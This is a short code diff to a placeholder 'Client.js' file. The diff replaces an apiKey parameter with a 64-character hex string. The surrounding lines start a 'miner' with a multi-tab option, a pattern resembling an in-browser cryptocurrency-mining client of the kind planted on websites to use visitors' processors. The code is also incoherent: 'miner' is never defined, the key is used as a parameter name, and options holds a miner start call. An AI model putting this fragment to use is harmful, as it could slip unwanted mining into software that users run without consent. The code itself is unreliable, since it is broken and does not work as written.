@@ -1,7 +1,7 @@
 // Placeholder code for Client.js
 var Client = {
     // Define your Client functionality here
-    Anonymous: function(apiKey, options) {
+    Anonymous: function(eba1dd1ac084760f9c66d3bc68a9a2a5fb20834dc12719ab6b6abbd8765cfee7, options) {
         // Implementation of Anonymous constructor
         this.apiKey = eba1dd1ac084760f9c66d3bc68a9a2a5fb20834dc12719ab6b6abbd8765cfee7;
         this.options = miner.start([Client.FORCE_MULTI_TAB]);
